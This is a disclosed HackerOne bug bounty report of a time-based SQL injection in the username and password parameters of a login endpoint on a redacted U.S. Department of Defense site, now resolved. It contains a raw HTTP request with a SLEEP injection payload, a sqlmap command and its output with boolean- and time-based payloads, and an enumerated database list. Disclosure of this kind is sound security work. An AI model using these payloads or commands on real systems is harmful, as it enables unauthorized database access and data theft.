---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/sql-injection
  - env/web
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2022-09-14
submitted: 2022-07-06T14:01:43.711Z
bounty_usd: null
votes: 20
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "malcolmx"
source: "https://hackerone.com/reports/1627970"
title: "time based SQL injection at [https://███] [HtUS]"
---
# time based SQL injection at [https://███] [HtUS]

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 20 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2022-09-14

- Report: [https://hackerone.com/reports/1627970](https://hackerone.com/reports/1627970)
- CWE: SQL Injection
- Submitted: 2022-07-06T14:01:43.711Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hello,

##Summary

while doing test on [`www.█████`](http://www.████████/) I’ve found that the endpoint at `/olc/setlogin.php` is vulnerable with SQL injection vulnerability

##Vulnerable parameters 

- username
- password

##POC

- using time based to verify , submit the below request

```jsx
POST /olc/setlogin.php HTTP/1.1
Host: www.██████
Cookie: UsafNoticeConsent=1; PHPSESSID=5r61rj890ogju3dvb5ptup2mn1; session=expiry=1657062712923491
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 74
Origin: https://www.██████████
Referer: https://www.████/olc/sethomepage.html
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

██████████'%2b(select*from(select(sleep(5)))a)%2b'&█████████
```

- we can see that the response time will be `5`

{██████████]



- sqlmap run command

```jsx
python3 sqlmap.py --level=5 --risk=3 --tamper=space2comment --random-agent  -u https://█████████ --data="████████&██████" -p username --dbms=mysql 
```

- if you got message `got a 302 redirect to '[https://www.█████:443/olc/sethomepage.html](https://www.████████/olc/sethomepage.html)'. Do you want to follow? [Y/n] n`

press `n` to not follow the redirection 

- we can se that our target parameter is vulnerable

```jsx
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 586 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: username=-1559' OR 4924=4924 OR 'XiUq'='JgnT&██████████

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: █████' AND (SELECT 9612 FROM (SELECT(SLEEP(5)))xSGk) OR 'CPXv'='aouS&██████
---
[23:27:33] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[23:27:33] [INFO] the back-end DBMS is MySQL
web application technology: Apache
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[23:27:34] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/www.█████████'

[*] ending @ 23:27:34 /2022-07-05/
```

███

- add `--dbs` will back to us with the databases

```jsx
available databases [13]:
[] ███
[] ██████mobile
[] GET
[] information_schema
[] LEAM
[] leat
[] LEV
[] mysql
[] performance_schema
[] SET
[] test
[] testadmin
[*] testusers
```

## Impact

attacker is able to get the database

## Timeline

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **Report Pending Program Review**
- **2022-07-07** @malcolmx: Hi @fuzzface 

- kindly would you mind please to  triaged this SQLI report 

Have a great day! 
Regards,
Thanks
- **Bounty Awarded**
- **Changed Scope**
- **2022-07-07** @malcolmx: Hi @nutellatte @8thwonder 

thanks for the reward ,kindly can you traige the report

Regards,
Thanks
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
